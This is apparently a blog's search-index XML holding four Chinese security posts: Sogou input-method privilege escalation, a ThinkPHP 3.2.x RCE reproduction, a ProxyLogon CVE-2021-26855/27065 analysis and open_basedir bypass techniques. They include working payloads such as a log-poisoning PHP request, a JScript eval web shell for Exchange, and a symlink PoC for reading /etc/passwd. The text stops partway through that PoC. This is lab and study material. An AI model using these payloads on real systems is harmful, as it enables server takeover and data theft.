<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>红队技巧之巧用输入法提权和维权</title>
    <link href="/2021/08/25/%E8%BE%93%E5%85%A5%E6%B3%95%E6%8F%90%E6%9D%83/"/>
    <url>/2021/08/25/%E8%BE%93%E5%85%A5%E6%B3%95%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚学安全的时候听师傅说起过可以用输入法进行提权,当时大为震惊。后来无意间看到关于该姿势的文章,重新想起这个事。虽然这个姿势有些年头了,但对我们这些新入安全门的小家伙来说,一切都是那么新奇。。。</p><h2 id="某狗输入法"><a href="#某狗输入法" class="headerlink" title="某狗输入法"></a>某狗输入法</h2><p>搜狗拼音输入法是目前国内使用人数最多的一款。在安装过程中默认给了Everyone完全控制权限，Everyone为所有用户，也就是说我们可以对搜狗拼音输入法安装目录下的任何文件进行修改,删除和写入，所以能达到我们权限提升的目的。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>操作系统:win10<br>输入法版本:<br>去官网下一个最新版的,版本号为<code>11.0.0.4909</code><br><img src="/img/%E8%BE%93%E5%85%A5%E6%B3%95%E6%8F%90%E6%9D%83/1.png"><br>默认安装后路径为<code>C:\Program Files (x86)\SogouInput</code></p><p>右键属性,查看安全。<br><img src="/img/%E8%BE%93%E5%85%A5%E6%B3%95%E6%8F%90%E6%9D%83/2.png"></p><p>发现Everyone竟然有完全控制权限,这意味着任何用户都能进行修改，删除和写入。</p><h3 id="提权利用"><a href="#提权利用" class="headerlink" title="提权利用"></a>提权利用</h3><p>辛苦拿到的webshell竟然只是个普通权限。<br><img src="/img/%E8%BE%93%E5%85%A5%E6%B3%95%E6%8F%90%E6%9D%83/3.png"></p><p>但发现目标主机装有该输入法,可以读取到<code>C:\Program Files (x86)\SogouInput</code>路径。<br><img src="/img/%E8%BE%93%E5%85%A5%E6%B3%95%E6%8F%90%E6%9D%83/4.png"></p><p>查看<code>C:\Program Files (x86)\SogouInput\11.0.0.4909</code>目录权限<br>尝试删除<code>SGTools.exe</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP3.2.x RCE分析复现</title>
    <link href="/2021/08/23/ThinkPHP3.2.x%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/08/23/ThinkPHP3.2.x%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意间在最新的漏洞报告中看到关于ThinkPHP3.2.x RCE漏洞通报,最近正好在学习php相关知识,准备闲来无事分析和复现一波。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy+php7.3.4+ThinkPHP3.2.3+windows10</p><p>在<code>\Application\Home\Controller\IndexController.class.php</code>目录下添加如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;display();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ThinkPHP3.2.xRCE/1.png"><br>因为该漏洞利用的assign函数需要模板渲染，所以需要创建对应的模板文件，内容随意，模板文件位置：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\A</span>pplication<span class="hljs-symbol">\H</span>ome<span class="hljs-symbol">\V</span>iew<span class="hljs-symbol">\I</span>ndex<span class="hljs-symbol">\i</span>ndex.html<br></code></pre></td></tr></table></figure><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>该漏洞产生原因是由于在业务代码中如果对模板赋值方法<code>assign的第一个参数可控</code>，则导致模板路径变量被覆盖为携带攻击代码路径，造成文件包含，代码执行等危害。 </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>文件<code>Application/Home/Controller/IndexController.class.php</code><br>assign方法中第一个变量为可控变量。<br><img src="/img/ThinkPHP3.2.xRCE/5.png"></p><p>进入到assign方法中<br><code>ThinkPHP/Library/Think/Controller.class.php</code><br><img src="/img/ThinkPHP3.2.xRCE/7.png"></p><p>实际上调用的是<code>ThinkPHP/Library/Think/View.class.php</code>中的assign函数,并赋值给<code>$this→tVar</code>变量。<br><img src="/img/ThinkPHP3.2.xRCE/6.png"></p><p>然后进入<code>display</code>方法<br><img src="/img/ThinkPHP3.2.xRCE/8.png"></p><p><code>Controller.class.php</code>的display调用<code>View.class.php</code>的display。<br><img src="/img/ThinkPHP3.2.xRCE/9.png"></p><p>调用<code>fetch</code>方法<br><img src="/img/ThinkPHP3.2.xRCE/10.png"></p><p>跟进<code>fetch</code>方法,先会判断模板文件是否存在,不存在直接返回。<br><img src="/img/ThinkPHP3.2.xRCE/11.png"></p><p>然后由于系统配置的默认模板引擎为Think,所以走else分支<br><img src="/img/ThinkPHP3.2.xRCE/12.png"></p><p>将<code>$this→tVar</code>变量值赋值给<code>$params</code>，此时var传入的日志路径，file为模板文件的路径。<br><img src="/img/ThinkPHP3.2.xRCE/13.png"></p><p>跟进listen函数,经过一些判断后进入<code>exec</code>函数中<br><img src="/img/ThinkPHP3.2.xRCE/14.png"></p><p>经过一定处理后将调用<code>Behavior\ParseTemplateBehavior</code>类中的<code>run</code>方法处理<code>$params</code>,而其中储存着带有日志文件路径的值。<br><img src="/img/ThinkPHP3.2.xRCE/15.png"></p><p>进入<code>\ThinkPHP\Library\Behavior\ParseTemplateBehavior.class.php</code>的run函数。寻找谁继续处理了日志文件路径,发现为<code>ThinkPHP/Library/Think/Template.class.php</code>的fetch方法,其中<code>$_data[var]</code>储存了日志文件路径的变量值。<br><img src="/img/ThinkPHP3.2.xRCE/16.png"></p><p>最后跟进到<code>Storage</code>的<code>load</code>方法<br><img src="/img/ThinkPHP3.2.xRCE/17.png"></p><p>判断<code>$vars</code>值是否为空,不为空则会以<code>EXTR_OVERWRITE</code>属性覆盖<code>$_filename</code>原有的值。最后<code>$_filename</code>将等于<code>./Application/Runtime/Logs/Common/21_08_23.log</code>,最后形成文件包含。<br><img src="/img/ThinkPHP3.2.xRCE/18.png"></p><p><img src="/img/ThinkPHP3.2.xRCE/19.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>创建log文件<br><a href="http://127.0.0.1/tp3/index.php?m=--&gt;">http://127.0.0.1/tp3/index.php?m=--&gt;</a><?=phpinfo();?></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /tp<span class="hljs-number">3</span>/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=np<span class="hljs-number">6</span>v<span class="hljs-number">88</span>jt<span class="hljs-number">9982</span>el<span class="hljs-number">6</span>btpcm<span class="hljs-number">998</span>moe<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/ThinkPHP3.2.xRCE/2.png"></p><p><img src="/img/ThinkPHP3.2.xRCE/4.png"><br>包含log文件,注意日志文件名,tp的日志文件名和年月日是相关的。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/tp3/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="hljs-string">_filename</span>]=./Application/Runtime/Logs/Common/21_08_23.log<br></code></pre></td></tr></table></figure><p><img src="/img/ThinkPHP3.2.xRCE/3.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>该漏洞由(【漏洞通报】ThinkPHP3.2.x RCE漏洞通报)[<a href="https://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247487129&amp;idx=1&amp;sn=3d80cc03e4f03a6bdb2be1611e98957c%5D">https://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247487129&amp;idx=1&amp;sn=3d80cc03e4f03a6bdb2be1611e98957c]</a> 在<br>今年07月12日率先纰漏,不过看到有大佬说这好像是个老洞,有类似的。不过这都与小弟无关,作为入门新手进行学习。如有错误请师傅们斧正。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021–26855与CVE-2021–27065漏洞分析及复现</title>
    <link href="/2021/08/19/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/"/>
    <url>/2021/08/19/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>微软在上半年三月披露了关于Exchange邮件服务器<code>CVE-2021–26855</code>(SSRF)与<code>CVE-2021–27065</code>(任意文件写入)的漏洞,这两个漏洞配合可以造成未授权的webshell写入,是非常严重的高危漏洞。漏洞刚出来那会儿并未注意,正好前两天4哥在群里发了个关于该漏洞的复现环境,重新想起这个事,正好暑假也没干啥正事,借此机会复现分析一下。</p><h2 id="CVE-2021–26855"><a href="#CVE-2021–26855" class="headerlink" title="CVE-2021–26855"></a>CVE-2021–26855</h2><p><code>CVE-2021–26855</code>是⼀个SSRF,只需要能够访问Exchange服务器,攻击者可以不经过任何类型的身份验证来利⽤此漏洞。</p><p>相关漏洞在<code>C:\Program Files\Microsoft\ExchangeServer\V15\FrontEnd\HttpProxy\bin</code>目录下的<code>Microsoft.Exchange.FrontEndHttpProxy.dll</code><br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/1.png"></p><p>进入<code>ProxyModule</code>类的<code>OnPostAuthorizeRequest</code>函数,该函数用于对post请求的安全检查,函数中继续调用了该类的<code>OnPostAuthorizeInternal</code>函数。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/2.png"></p><p><code>OnPostAuthorizeInternal</code>函数中调用<code>SelectHandlerForUnauthenticatedRequest</code>函数,从函数名称上来看该函数作用为:寻找对未验证安全请求的处理方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/3.png"></p><p>跟进<code>SelectHandlerForUnauthenticatedRequest</code>函数,发现对不同的<code>ProtocolType</code>,生成了不同的 <code>httpHandler</code>。而这个<code>ProtocolType</code>正是url中的web子目录,比如请求<code>/ecp/n.png</code>,<code>ProtocolType</code>就是ecp。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/4.png"></p><p>当<code>ProtocolType</code>为ecp时,如果<code>BEResourceRequestHandler</code>类的<code>CanHandle</code>函数返回值为真,就会使用<code>BEResourceRequestHandler</code>作为处理方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/5.png"></p><p>跟进<code>CanHandle</code>方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/6.png"></p><p>可以看到如果要返回真,则需要同时让<code>GetBEResouceCookie</code>和<code>IsResourceRequest</code>函数同时返回值为真。跟进这两个函数。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/7.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/8.png"></p><p>先看<code>GetBEResouceCookie</code>,该函数要请求cookies中一个<code>BEResource</code>字段的值,实际上就是<code>X-BEResource</code>。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/9.png"></p><p>那么在cookies中设置一个<code>X-BEResource</code>字段的值即可。<br><code>IsResourceRequest</code>则是需要请求路径以<code>.js</code>,<code>.png</code>等结尾。</p><p>这时候回到<code>OnPostAuthorizeInternal</code>函数中,由于<code>BEResourceRequestHandler</code>是继承于<code>ProxyRequstHandler</code>类的,就会执行<code>((ProxyRequestHandler)httpHandler).Run(context)</code>,最终在<code>HttpContext.RemapHandler</code>中把该httpHandler设置给<code>this._remapHandler</code>，即是context.Handler。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/11.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/10.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/12.png"></p><p>又调用了<code>Handler.BeginProcessRequest()</code>,此时Handler为<code>BEResourceRequestHandler</code>,该类没有<code>BeginProcessRequest</code>函数,但却继承了<code>ProxyRequestHandler</code>。因此实际上调用的是<code>ProxyRequestHandler.BeginProcessRequest()</code>函数。</p><p><code>BeginProcessRequest</code>函数创建线程调用<code>ProxyRequestHandler.BeginCalculateTargetBackEnd</code>函数。该函数作用是根据Cookie中的<code>X-BEResource</code>字段来判断与生成指向BackEnd的目标url。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/13.png"></p><p>继续跟入,<code>BeginCalculateTargetBackEnd</code>调用<code>ProxyRequestHandler.InternalBeginCalculateTargetBackEnd</code>方法。</p><p><code>InternalBeginCalculateTargetBackEnd</code>调用<code>BEResourceRequestHandler.ResolveAnchorMailbox</code>方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/14.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/15.png"><br><code>BEResourceRequestHandler.ResolveAnchorMailbox</code>方法会获取<code>X-BEResource</code>字段。</p><p>跟入查看<code>BackEndServer.FromString</code>函数,会发现它依据<code>~</code>符号切割<code>beresourceCookie</code>字符串,前半段作为fqdn,后半段作为version。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/16.png"></p><p>fqdn为:全限定域名。在邮件中例如:<a href="mailto:&#x73;&#x64;&#x40;&#x76;&#x69;&#x70;&#x2e;&#x63;&#x6f;&#x6d;">&#x73;&#x64;&#x40;&#x76;&#x69;&#x70;&#x2e;&#x63;&#x6f;&#x6d;</a><br>而version指的是BackEndServer Version。</p><p>fqdn和verison变量将在<code>ProxyRequestHandler.BeginProxyRequest</code>函数中调用的的<code>GetTargetBackEndServerUrl</code>函数进行调用。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/17.png"></p><p>由于<code>BackEndServer.Fqdn</code>是可控的,<code>clientUrlForProxy.Host</code>则是可控的。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/18.png"></p><p>继续看<code>ProxyRequestHandler.BeginProxyRequest</code>后面,<code>ProxyRequestHandler.CreateServerRequest</code>将吧uri发送给后端服务器。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/19.png"></p><p>跟踪<code>ProxyRequestHandler.CreateServerRequest</code>,函数中<code>PrepareServerRequest</code>将进行uri代理请求的身份认证判断。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/20.png"></p><p>通过最后一个else绕过认证,达到一个SSRF漏洞攻击的过程。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/21.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/26.png"></p><h2 id="CVE-2021–27065"><a href="#CVE-2021–27065" class="headerlink" title="CVE-2021–27065"></a>CVE-2021–27065</h2><p><code>CVE-2021–27065</code>是⼀个任意⽂件写⼊漏洞，它需要登陆的管理员账号权限才能触发。而<code>CVE-2021–26855</code>正好可以为我们提供了管理员账号权限。</p><p>登录管理员账号后,进入:服务器——&gt;虚拟目录——&gt;OAB<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/22.png"></p><p>编辑OAB配置,在外部链接中写⼊shell并保存。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://aaa/<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Page_Load</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">eval</span>(Request[<span class="hljs-string">&quot;SD&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/23.png"></p><p>保存后选择重置虚拟目录<br>写下shell位置为:<code>\\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\sd.aspx</code><br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/24.png"></p><p>查看shell文件,写入了一句话木马。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/25.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.praetorian.com/blog/reproducing-proxylogon-exploit/">https://www.praetorian.com/blog/reproducing-proxylogon-exploit/</a></p><p><a href="https://jishuin.proginn.com/p/763bfbd5ac72">https://jishuin.proginn.com/p/763bfbd5ac72</a></p><p><a href="https://zhuanlan.zhihu.com/p/357183471">https://zhuanlan.zhihu.com/p/357183471</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass open_basedir总结</title>
    <link href="/2021/08/14/bypass_open_basedir/"/>
    <url>/2021/08/14/bypass_open_basedir/</url>
    
    <content type="html"><![CDATA[<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。<br>在<code>php.ini</code>中设置<code>open_basedir</code>的值</p><p><img src="/img/bypass_open_basedir/1.png"></p><p><img src="/img/bypass_open_basedir/2.png"></p><p>设置<code>open_basedir=/var/www/html/</code>,通过web访问服务器的用户就无法获取服务器上除了<code>/var/www/html/</code>这个目录以外的文件。<br>假设这时连接一个webshell,当webshell工具尝试遍历和读取其他目录时将会失败。<br><img src="/img/bypass_open_basedir/3.png"></p><h2 id="通过系统命令函数"><a href="#通过系统命令函数" class="headerlink" title="通过系统命令函数"></a>通过系统命令函数</h2><p><code>open_basedir</code>对命令执行函数没有限,使用<code>system()</code>函数试一下<br><img src="/img/bypass_open_basedir/4.png"></p><p>能够遍历上上级目录,而在webshell工具中时被禁止的,说明确实能够绕过<br><img src="/img/bypass_open_basedir/5.png"></p><p>实际情况中,可能<code>system()</code>函数由于disable_function禁用无法使用,可通过同类执行命令函数绕过。</p><h2 id="利用glob-绕过"><a href="#利用glob-绕过" class="headerlink" title="利用glob://绕过"></a>利用glob://绕过</h2><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p><code>glob://</code>是查找匹配的文件路径模式,<code>glob</code>数据流包装器自 PHP 5.3.0 起开始有效。<br>下面是<a href="https://www.php.net/manual/zh/wrappers.glob.php">官方</a>的一个domo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="hljs-comment">// 并打印文件名和文件尺寸</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob://ext/spl/examples/*.php&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    printf(<span class="hljs-string">&quot;%s: %.1FK\n&quot;</span>, <span class="hljs-variable">$f</span>-&gt;getFilename(), <span class="hljs-variable">$f</span>-&gt;getSize()/<span class="hljs-number">1024</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要和其他函数配合,单独的glob是无法绕过的。<br>并且局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p><h3 id="利用-DirectoryIterator-glob"><a href="#利用-DirectoryIterator-glob" class="headerlink" title="利用 DirectoryIterator+glob://"></a>利用 DirectoryIterator+glob://</h3><p><code>DirectoryIterator</code> 类提供了一个简单的界面来查看文件系统目录的内容。<br>脚本如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/6.png"></p><h3 id="利用-opendir-readdir-glob"><a href="#利用-opendir-readdir-glob" class="headerlink" title="利用 opendir()+readdir()+glob://"></a>利用 opendir()+readdir()+glob://</h3><p><code>opendir</code>作用为打开目录句柄<br><code>readdir</code>作用为从目录句柄中读取目录</p><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    closedir(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只能列目录，php7可以用如下方法读非根目录文件,<code>glob:///*/www/../*</code> 可列举 <code>/var</code></p><p><img src="/img/bypass_open_basedir/7.png"></p><h3 id="利用-scandir-glob"><a href="#利用-scandir-glob" class="headerlink" title="利用 scandir()+glob://"></a>利用 scandir()+glob://</h3><p><code>scandir()</code>函数可以列出指定路径中的文件和目录<br><img src="/img/bypass_open_basedir/8.png"></p><p>这种方法也只能列出根目录和open_basedir允许目录下的文件。</p><h2 id="利用symlink绕过"><a href="#利用symlink绕过" class="headerlink" title="利用symlink绕过"></a>利用symlink绕过</h2><p><code>symlink()</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">symlink(<span class="hljs-keyword">string</span> <span class="hljs-variable">$target</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$link</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>symlink()对于已有的 target 建立一个名为 link 的符号连接。<br>而target一般情况下受限于open_basedir。<br>官方的domo:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;uploads.php&#x27;</span>;<br><span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;uploads&#x27;</span>;<br>symlink(<span class="hljs-variable">$target</span>, <span class="hljs-variable">$link</span>);<br><br><span class="hljs-keyword">echo</span> readlink(<span class="hljs-variable">$link</span>);<br><span class="hljs-comment"># 将会输出&#x27;uploads.php&#x27;这个字符串</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果将要读取<code>/etc/passwd</code>poc如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mkdir(<span class="hljs-string">&quot;A&quot;</span>);<br>chdir(<span class="hljs-string">&quot;A&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;B&quot;</span>);<br>chdir(<span class="hljs-string">&quot;B&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;C&quot;</span>);<br>chdir(<span class="hljs-string">&quot;C&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;D&quot;</span>);<br>chdir(<span class="hljs-string">&quot;D&quot;</span>);<br>chdir(<span class="hljs-string">&quot;..&quot;</span>);<br>chdir(<span class="hljs-string">&quot;..&quot;</span>);<br>chdir(<span class="hljs-string">&quot;..&quot;</span>);<br>chdir(<span 